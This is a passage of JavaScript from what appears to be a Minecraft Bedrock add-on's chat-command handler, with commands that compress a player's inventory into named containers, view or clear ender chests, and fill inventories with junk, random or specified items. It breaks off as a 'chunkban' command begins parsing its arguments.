                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("chest"); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [0, 9], [0, 9]); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Hotbar: Slots 0-8§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); });
                        }
                        else if ((args[1] ?? "").trim() == "armor" || (args[1] ?? "").trim() == "equipment") {
                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("chest"); [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, i) => { block.getComponent("inventory").container.setItem(9 + i, target.getComponent("equippable").getEquipment(v)); target.getComponent("equippable").setEquipment(v); }); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Equipment: Armor and Offhand§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); });
                        }
                    }
                }
                break;
            case !!switchTest.match(/^compressitemsshulker$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[2]?.trim() == "~") {
                        args[2] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[2] ?? "").trim() == "") {
                        args[2] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[2]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[2]}. `);
                    }
                    else {
                        if ((args[1] ?? "").trim() == "" || (args[1] ?? "").trim() == "all") {
                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("shulker_box"); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [0, 27], [0, 27]); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Items: Slots 0-26§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [27, 36], [0, 27]); [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, i) => { block.getComponent("inventory").container.setItem(9 + i, target.getComponent("equippable").getEquipment(v)); target.getComponent("equippable").setEquipment(v); }); let item2 = block.getItemStack(1, true); item2.nameTag = `§r§a${target.name}'s Items: Slots 27-35, Armor, and Offhand\n§b${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); target.getComponent("inventory").container.addItem(item2); });
                        }
                        else if ((args[1] ?? "").trim() == "inventory") {
                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("shulker_box"); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [9, 36], [0, 27]); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Items: Slots 9-35§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); });
                        }
                        else if ((args[1] ?? "").trim() == "hotbar") {
                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("shulker_box"); inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [0, 9], [0, 9]); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Hotbar: Slots 0-8§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); });
                        }
                        else if ((args[1] ?? "").trim() == "armor" || (args[1] ?? "").trim() == "equipment") {
                            system.run(() => { let block = player.dimension.getBlock(player.location); block.setType("shulker_box"); [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, i) => { block.getComponent("inventory").container.setItem(9 + i, target.getComponent("equippable").getEquipment(v)); target.getComponent("equippable").setEquipment(v); }); let item = block.getItemStack(1, true); item.nameTag = `§r§a${target.name}'s Equipment: Armor and Offhand§b\n${new Date(Date.now()).toUTCString()}`; clearContainer(block.getComponent("inventory").container); block.setType("air"); target.getComponent("inventory").container.addItem(item); });
                        }
                    }
                }
                break;
            case !!switchTest.match(/^compressitemscontainer$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "presetText", "stringdw"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[3]?.trim() == "~") {
                        args[3] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[3] ?? "").trim() == "") {
                        args[3] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[3]);
                    if (!!!BlockTypes.get(args[1])) {
                        player.sendMessage(`§cSyntax error: Unexpected "${args[1]}": at ${switchTestB.slice(0, switchTestB.indexOf(args[1]))}">>${args[1]}<<"`);
                    }
                    else if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[3]}. `);
                    }
                    else
                        system.run(() => {
                            if (!!!(() => { let block = player.dimension.getBlock(player.location); block.setType(args[1]); let component = block.getComponent("inventory"); block.setType("air"); return component; })()) {
                                player.sendMessage(`§cError: Block of type ${BlockTypes.get(args[1]).id} is not a container block. `);
                            }
                            else {
                                if ((args[2] ?? "").trim() == "" || (args[2] ?? "").trim() == "all") {
                                    let block = player.dimension.getBlock(player.location);
                                    let items = [];
                                    block.setType(args[1]);
                                    let runSeparate = false;
                                    let runTogether = false;
                                    for (let i = 0; i < (Math.max(0, (36 / block.getComponent("inventory").container.size))); i++) {
                                        inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [i * block.getComponent("inventory").container.size, Math.min((i + 1) * block.getComponent("inventory").container.size, 36)], [0, block.getComponent("inventory").container.size]);
                                        if (((i + 1) * block.getComponent("inventory").container.size) > 41) {
                                            [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, ib) => {
                                                block.getComponent("inventory").container.setItem((block.getComponent("inventory").container.size - (Math.min((i + 1) * block.getComponent("inventory").container.size, 36) - (i * block.getComponent("inventory").container.size))) + ib, target.getComponent("equippable").getEquipment(v));
                                                target.getComponent("equippable").setEquipment(v);
                                            });
                                            runTogether = true;
                                        }
                                        else {
                                            if ((i + 1) >= (Math.max(0, (36 / block.getComponent("inventory").container.size)))) {
                                                runSeparate = true;
                                            }
                                        }
                                        ;
                                        let item = block.getItemStack(1, true);
                                        item.nameTag = `§r§a${target.name}'s Items: Slots ${i * block.getComponent("inventory").container.size}-${Math.min((i + 1) * block.getComponent("inventory").container.size, 36)}${runTogether ? ", Armor, and Offhand" : ""}§b\n${new Date(Date.now()).toUTCString()}`;
                                        clearContainer(block.getComponent("inventory").container);
                                        items.push(item);
                                    }
                                    ;
                                    if (runSeparate) {
                                        for (let i = 0; i < (Math.max(0, (5 / block.getComponent("inventory").container.size))); i++) {
                                            [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].slice(i * block.getComponent("inventory").container.size, (i + 1) * block.getComponent("inventory").container.size).forEach((v, ib) => {
                                                block.getComponent("inventory").container.setItem(ib, target.getComponent("equippable").getEquipment(v));
                                                target.getComponent("equippable").setEquipment(v);
                                            });
                                            let item2 = block.getItemStack(1, true);
                                            item2.nameTag = `§r§a${target.name}'s Equipment: Armor, and Offhand\n§b${new Date(Date.now()).toUTCString()}`;
                                            clearContainer(block.getComponent("inventory").container);
                                            items.push(item2);
                                        }
                                        ;
                                    }
                                    ;
                                    block.setType("air");
                                    items.forEach(item => target.getComponent("inventory").container.addItem(item));
                                }
                                else if ((args[2] ?? "").trim() == "inventory") {
                                    let block = player.dimension.getBlock(player.location);
                                    block.setType(args[1]);
                                    inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [9, 36], [0, 27]);
                                    let item = block.getItemStack(1, true);
                                    item.nameTag = `§r§a${target.name}'s Items: Slots 9-35§b\n${new Date(Date.now()).toUTCString()}`;
                                    clearContainer(block.getComponent("inventory").container);
                                    block.setType("air");
                                    target.getComponent("inventory").container.addItem(item);
                                }
                                else if ((args[2] ?? "").trim() == "hotbar") {
                                    let block = player.dimension.getBlock(player.location);
                                    block.setType(args[1]);
                                    inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [0, 9], [0, 9]);
                                    let item = block.getItemStack(1, true);
                                    item.nameTag = `§r§a${target.name}'s Hotbar: Slots 0-8§b\n${new Date(Date.now()).toUTCString()}`;
                                    clearContainer(block.getComponent("inventory").container);
                                    block.setType("air");
                                    target.getComponent("inventory").container.addItem(item);
                                }
                                else if ((args[2] ?? "").trim() == "armor" || (args[2] ?? "").trim() == "equipment") {
                                    let block = player.dimension.getBlock(player.location);
                                    block.setType(args[1]);
                                    [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, i) => { block.getComponent("inventory").container.setItem(9 + i, target.getComponent("equippable").getEquipment(v)); target.getComponent("equippable").setEquipment(v); });
                                    let item = block.getItemStack(1, true);
                                    item.nameTag = `§r§a${target.name}'s Equipment: Armor and Offhand§b\n${new Date(Date.now()).toUTCString()}`;
                                    clearContainer(block.getComponent("inventory").container);
                                    block.setType("air");
                                    target.getComponent("inventory").container.addItem(item);
                                }
                            }
                        });
                }
                break;
            case !!switchTest.match(/^compressitemscontainerb$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "string"], switchTestB.split(" ").slice(2).join(" ")).args;
                    if (switchTestB.split(/\s+/g)[3]?.trim() == "~") {
                        args[1] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[3] ?? "").trim() == "") {
                        args[1] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[1]);
                    if (!!!BlockTypes.get(JSONParse(switchTestB.split(" ")[1])?.id)) {
                        player.sendMessage(`§cSyntax error: Unexpected "${args[1]}": at ${switchTestB.slice(0, switchTestB.indexOf(args[1]))}">>${args[1]}<<"`);
                    }
                    else if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[1]}. `);
                    }
                    else
                        system.run(() => {
                            if (!!!(() => { let block = player.dimension.getBlock(player.location); block.setPermutation(BlockPermutation.resolve(JSONParse(switchTestB.split(" ")[1])?.id, JSONParse(switchTestB.split(" ")[1])?.states)); let component = block.getComponent("inventory"); block.setType("air"); return component; })()) {
                                player.sendMessage(`§cError: Block of type ${BlockTypes.get(JSONParse(switchTestB.split(" ")[1])?.id).id} is not a container block. `);
                            }
                            else {
                                if ((args[0] ?? "").trim() == "" || (args[0] ?? "").trim() == "all") {
                                    let block = player.dimension.getBlock(player.location);
                                    let items = [];
                                    block.setPermutation(BlockPermutation.resolve(JSONParse(switchTestB.split(" ")[1])?.id, JSONParse(switchTestB.split(" ")[1])?.states));
                                    let runSeparate = false;
                                    let runTogether = false;
                                    for (let i = 0; i < (Math.max(0, (36 / block.getComponent("inventory").container.size))); i++) {
                                        inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [i * block.getComponent("inventory").container.size, Math.min((i + 1) * block.getComponent("inventory").container.size, 36)], [0, block.getComponent("inventory").container.size]);
                                        if (((i + 1) * block.getComponent("inventory").container.size) > 41) {
                                            [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, ib) => {
                                                block.getComponent("inventory").container.setItem((block.getComponent("inventory").container.size - (Math.min((i + 1) * block.getComponent("inventory").container.size, 36) - (i * block.getComponent("inventory").container.size))) + ib, target.getComponent("equippable").getEquipment(v));
                                                target.getComponent("equippable").setEquipment(v);
                                            });
                                            runTogether = true;
                                        }
                                        else {
                                            if ((i + 1) >= (Math.max(0, (36 / block.getComponent("inventory").container.size)))) {
                                                runSeparate = true;
                                            }
                                        }
                                        ;
                                        let item = block.getItemStack(1, true);
                                        item.nameTag = `§r§a${target.name}'s Items: Slots ${i * block.getComponent("inventory").container.size}-${Math.min((i + 1) * block.getComponent("inventory").container.size, 36)}${runTogether ? ", Armor, and Offhand" : ""}§b\n${new Date(Date.now()).toUTCString()}`;
                                        clearContainer(block.getComponent("inventory").container);
                                        items.push(item);
                                    }
                                    ;
                                    if (runSeparate) {
                                        [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, ib) => {
                                            block.getComponent("inventory").container.setItem(ib, target.getComponent("equippable").getEquipment(v));
                                            target.getComponent("equippable").setEquipment(v);
                                        });
                                        let item2 = block.getItemStack(1, true);
                                        item2.nameTag = `§r§a${target.name}'s Equipment: Armor, and Offhand\n§b${new Date(Date.now()).toUTCString()}`;
                                        clearContainer(block.getComponent("inventory").container);
                                        items.push(item2);
                                    }
                                    ;
                                    block.setType("air");
                                    items.forEach(item => target.getComponent("inventory").container.addItem(item));
                                }
                                else if ((args[0] ?? "").trim() == "inventory") {
                                    let block = player.dimension.getBlock(player.location);
                                    block.setType(args[1]);
                                    inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [9, 36], [0, 27]);
                                    let item = block.getItemStack(1, true);
                                    item.nameTag = `§r§a${target.name}'s Items: Slots 9-35§b\n${new Date(Date.now()).toUTCString()}`;
                                    clearContainer(block.getComponent("inventory").container);
                                    block.setType("air");
                                    target.getComponent("inventory").container.addItem(item);
                                }
                                else if ((args[0] ?? "").trim() == "hotbar") {
                                    let block = player.dimension.getBlock(player.location);
                                    block.setType(args[1]);
                                    inventorySwapC(target.getComponent("inventory").container, block.getComponent("inventory").container, [0, 9], [0, 9]);
                                    let item = block.getItemStack(1, true);
                                    item.nameTag = `§r§a${target.name}'s Hotbar: Slots 0-8§b\n${new Date(Date.now()).toUTCString()}`;
                                    clearContainer(block.getComponent("inventory").container);
                                    block.setType("air");
                                    target.getComponent("inventory").container.addItem(item);
                                }
                                else if ((args[0] ?? "").trim() == "armor" || (args[2] ?? "").trim() == "equipment") {
                                    let block = player.dimension.getBlock(player.location);
                                    block.setType(args[1]);
                                    [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Offhand].forEach((v, i) => { block.getComponent("inventory").container.setItem(9 + i, target.getComponent("equippable").getEquipment(v)); target.getComponent("equippable").setEquipment(v); });
                                    let item = block.getItemStack(1, true);
                                    item.nameTag = `§r§a${target.name}'s Equipment: Armor and Offhand§b\n${new Date(Date.now()).toUTCString()}`;
                                    clearContainer(block.getComponent("inventory").container);
                                    block.setType("air");
                                    target.getComponent("inventory").container.addItem(item);
                                }
                            }
                        });
                }
                break;
            case !!switchTest.match(/^scanenderchest$/) || !!switchTest.match(/^ecinvsee$/) || !!switchTest.match(/^scnendchest$/):
                {
                    eventData.cancel = true;
                    system.run(() => {
                        let args = evaluateParameters(switchTestB, ["presetText", "targetSelector"]).args;
                        if (switchTestB.split(/\s+/g)[1]?.trim() == "~") {
                            args[1] = player.name;
                        }
                        if ((switchTestB.split(/\s+/g)[1] ?? "").trim() == "") {
                            args[1] = player.name;
                        }
                        let targets = targetSelectorAllListC(args[3], "", vTStr(player.location), player).filter(v => v.typeId == "minecraft:player");
                        if (targets.length == 0) {
                            player.sendMessage(`§cError: No players matching the specified target selector were found. `);
                        }
                        else
                            targets.forEach(target => {
                                let slots = [];
                                for (let i = 0; i < 27; i++) {
                                    slots.push(`slot: ${i}, item: ${ItemTypes.getAll().find(v => target.runCommand(`testfor @s[hasitem={location=slot.enderchest,item=${v.id},slot=${i}}]`).successCount != 0)?.id ?? "minecraft:air"}`);
                                }
                                ;
                                player.sendMessage(`${target.name}'s Ender Chest Contents: \n${slots.join("§r§f\n")}`);
                            });
                    });
                }
                break;
            case !!switchTest.match(/^scanenderchestc$/) || !!switchTest.match(/^ecinvseec$/) || !!switchTest.match(/^scnendchestc$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParameters(switchTestB, ["presetText", "string"]).args;
                    if (switchTestB.split(/\s+/g)[1]?.trim() == "~") {
                        args[1] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[1] ?? "").trim() == "") {
                        args[1] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[1]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[1]}. `);
                    }
                    else
                        system.run(() => {
                            let slots = [];
                            for (let i = 0; i < 27; i++) {
                                slots.push(`slot: ${i}, item: ${ItemTypes.getAll().find(v => target.runCommand(`testfor @s[hasitem={location=slot.enderchest,item=${v.id},slot=${i}}]`).successCount != 0)?.id ?? "minecraft:air"}, amount: ${rangeToIntArray([0, 255]).reverse().find(v => target.runCommand(`testfor @s[hasitem={location=slot.enderchest,count=${v},slot=${i}}]`).successCount != 0)}`);
                            }
                            ;
                            player.sendMessage(`${target.name}'s Ender Chest Contents: \n${slots.join("§r§f\n")}`);
                        });
                }
                break;
            case !!switchTest.match(/^clearenderchestslot$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "number", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[2]?.trim() == "~") {
                        args[2] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[2] ?? "").trim() == "") {
                        args[2] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[2]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[2]}. `);
                    }
                    else
                        system.run(() => {
                            let success = target.runCommand(`replaceitem entity @s slot.enderchest ${args[1]} air`).successCount;
                            if (success != 0) {
                                player.sendMessage(`Successfully cleared slot ${args[1]} of ${target.name}'s ender chest. `);
                            }
                            else {
                                player.sendMessage(`§cError: Failed to clear slot ${args[1]} of ${target.name}'s ender chest. `);
                            }
                        });
                }
                break;
            case !!switchTest.match(/^clearenderchest$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[1]?.trim() == "~") {
                        args[1] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[1]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[1]}. `);
                    }
                    else
                        system.run(() => {
                            let success = 0;
                            for (let i = 0; i < 27; i++) {
                                success += target.runCommand(`replaceitem entity @s slot.enderchest ${i} air`).successCount;
                            }
                            ;
                            if (success != 0) {
                                player.sendMessage(`Successfully cleared ${success} slot(s) of ${target.name}'s ender chest. `);
                            }
                            else {
                                player.sendMessage(`§cError: Failed to clear ${target.name}'s ender chest. `);
                            }
                        });
                }
                break;
            case !!switchTest.match(/^filljunk$/) || !!switchTest.match(/^invfilljunk$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[3]?.trim() == "~") {
                        args[3] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[3] ?? "").trim() == "") {
                        args[3] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[3]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[3]}. `);
                    }
                    else
                        system.run(() => {
                            if ((args[1] ?? "").trim().toLowerCase() == "" || (args[1] ?? "").trim().toLowerCase() == "fill") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(JunkItemTypes)[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "" ? 255 : (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Math.max(1, Number(args[2].trim().toLowerCase().replace(/~+/, "255")))))));
                                }
                                ;
                            }
                            else if ((args[1] ?? "").trim().toLowerCase() == "replacefill" || (args[1] ?? "").trim().toLowerCase() == "replaceall") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(JunkItemTypes)[0];
                                    target.getComponent("inventory").container.setItem(i, new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                            else {
                                for (let i = 0; i < Number(args[1].trim().toLowerCase().replace(/~+/, "36")); i++) {
                                    let t = shuffle(JunkItemTypes)[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                        });
                }
                break;
            case !!switchTest.match(/^fillrandom$/) || !!switchTest.match(/^invfillrandom$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[3]?.trim() == "~") {
                        args[3] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[3] ?? "").trim() == "") {
                        args[3] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[3]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[3]}. `);
                    }
                    else
                        system.run(() => {
                            if ((args[1] ?? "").trim().toLowerCase() == "" || (args[1] ?? "").trim().toLowerCase() == "fill") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(ItemTypes.getAll())[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "" ? 255 : (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Math.max(1, Number(args[2].trim().toLowerCase().replace(/~+/, "255")))))));
                                }
                                ;
                            }
                            else if ((args[1] ?? "").trim().toLowerCase() == "replacefill" || (args[1] ?? "").trim().toLowerCase() == "replaceall") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(ItemTypes.getAll())[0];
                                    target.getComponent("inventory").container.setItem(i, new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                            else {
                                for (let i = 0; i < Number(args[1].trim().toLowerCase().replace(/~+/, "36")); i++) {
                                    let t = shuffle(ItemTypes.getAll())[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                        });
                }
                break;
            case !!switchTest.match(/^fillop$/) || !!switchTest.match(/^invfillop$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[3]?.trim() == "~") {
                        args[3] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[3] ?? "").trim() == "") {
                        args[3] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[3]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[3]}. `);
                    }
                    else
                        system.run(() => {
                            if ((args[1] ?? "").trim().toLowerCase() == "" || (args[1] ?? "").trim().toLowerCase() == "fill") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(OpItemTypes)[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "" ? 255 : (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Math.max(1, Number(args[2].trim().toLowerCase().replace(/~+/, "255")))))));
                                }
                                ;
                            }
                            else if ((args[1] ?? "").trim().toLowerCase() == "replacefill" || (args[1] ?? "").trim().toLowerCase() == "replaceall") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(OpItemTypes)[0];
                                    target.getComponent("inventory").container.setItem(i, new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                            else {
                                for (let i = 0; i < Number(args[1].trim().toLowerCase().replace(/~+/, "36")); i++) {
                                    let t = shuffle(OpItemTypes)[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                        });
                }
                break;
            case !!switchTest.match(/^fillillegal$/) || !!switchTest.match(/^invfillillegal$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[3]?.trim() == "~") {
                        args[3] = player.name;
                    }
                    if ((switchTestB.split(/\s+/g)[3] ?? "").trim() == "") {
                        args[3] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[3]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[3]}. `);
                    }
                    else
                        system.run(() => {
                            if ((args[1] ?? "").trim().toLowerCase() == "" || (args[1] ?? "").trim().toLowerCase() == "fill") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(IllegalItemTypes)[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "" ? 255 : (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Math.max(1, Number(args[2].trim().toLowerCase().replace(/~+/, "255")))))));
                                }
                                ;
                            }
                            else if ((args[1] ?? "").trim().toLowerCase() == "replacefill" || (args[1] ?? "").trim().toLowerCase() == "replaceall") {
                                for (let i = 0; i < target.getComponent("inventory").container.size; i++) {
                                    let t = shuffle(IllegalItemTypes)[0];
                                    target.getComponent("inventory").container.setItem(i, new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                            else {
                                for (let i = 0; i < Number(args[1].trim().toLowerCase().replace(/~+/, "36")); i++) {
                                    let t = shuffle(IllegalItemTypes)[0];
                                    target.getComponent("inventory").container.addItem(new ItemStack(t, (args[2].trim().toLowerCase() == "max" ? new ItemStack(t).maxAmount : Number(args[2].trim().toLowerCase().replace(/~+/, "255")))));
                                }
                                ;
                            }
                        });
                }
                break;
            case !!switchTest.match(/^fillinventory$/) || !!switchTest.match(/^invfill$/):
                {
                    eventData.cancel = true; /*
                    console.warn(switchTestB.split(" ")?.length)*/
                    if (switchTestB.split(" ")?.length == 1) {
                        player.sendMessage(`${switchTest} command format: ${switchTest} <itemJSON: itemJSON> [mode: fill|replacefill|replaceall] [playerTarget: targetSelector]\nfor the format for the itemJSON just type in "\\help itemjsonformat". `);
                    }
                    else {
                        system.run(() => {
                            let argsa = evaluateParameters(switchTestB, [{ type: "presetText" }, { type: "json" }, { type: "presetText" }, { type: "targetSelector" }]);
                            let args = argsa.args;
                            if (args[3]?.trim() == "~") {
                                args[3] = player.name;
                            }
                            if ((args[3] ?? "").trim() == "") {
                                args[3] = player.name;
                            }
                            let targets = targetSelectorAllListC(args[3], "", vTStr(player.location), player).filter(v => v.typeId == "minecraft:player");
                            if (targets.length == 0) {
                                player.sendMessage(`§cError: No players matching the specified target selector were found. `);
                            }
                            else {
                                let item = !!(args[1]?.count ?? args[1]?.amount) ? Object.assign(itemJSONPropertiesEval(args[1]), { count: 255 }) : itemJSONPropertiesEval(args[1]);
                                let successes = [];
                                targets.forEach(target => {
                                    let successcount = 0;
                                    if ((args[2] ?? "").trim().toLowerCase() == "" || (args[2] ?? "").trim().toLowerCase() == "fill") {
                                        entityToContainerSlotArray(target, true, false).filter(v => !!!v.getItem()).forEach(v => { v.setItem(item); successcount++; });
                                        successes.push([target.name, successcount]);
                                    }
                                    else if ((args[2] ?? "").trim().toLowerCase() == "replacefill" || (args[2] ?? "").trim().toLowerCase() == "replaceall") {
                                        entityToContainerSlotArray(target, true, false).forEach(v => { v.setItem(item); successcount++; });
                                        successes.push([target.name, successcount]);
                                    }
                                    else {
                                        entityToContainerSlotArray(target, true, false).filter(v => !!!v.getItem()).slice(0, Number(args[2])).forEach(v => { v.setItem(item); successcount++; });
                                        successes.push([target.name, successcount]);
                                    }
                                });
                                if (successes.filter(v => v[1] != 0).length != 0) {
                                    player.sendMessage(`Successfully filled the ${successes.filter(v => v[1] != 0).length == 1 ? "inventory" : "inventories"} of ${successes.filter(v => v[1] != 0).map(v => `${v[0]}{${v[1]} slots}`).join(", ")} with ${item.typeId} * ${item.amount}`);
                                }
                                ;
                            }
                        });
                    }
                }
                break;
            case !!switchTest.match(/^chunkban$/):
                {
                    eventData.cancel = true;
                    let args = evaluateParametersOld(["presetText", "presetText", "presetText", "string"], switchTestB).args;
                    if (switchTestB.split(/\s+/g)[3]?.trim() == "~" || (switchTestB.split(/\s+/g)[3] ?? "").trim() == "") {
                        args[3] = player.name;
                    }
                    let target = world.getAllPlayers().find(_ => _.name == args[3]);
                    if (!!!target) {
                        player.sendMessage(`§cError: Unable to find player with the name ${args[3]}. `);
                    }
                    else {
                        if (switchTestB.split(/\s+/g)[1]?.trim() == "~" || (switchTestB.split(/\s+/g)[1] ?? "").trim() == "") {
                            args[1] = target.selectedSlot;
                        }
                        if (switchTestB.split(/\s+/g)[2]?.trim() == "~" || (switchTestB.split(/\s+/g)[2] ?? "").trim() == "") {
                            args[2] = 1;
                        }
                        let slot = Number(args[1]);
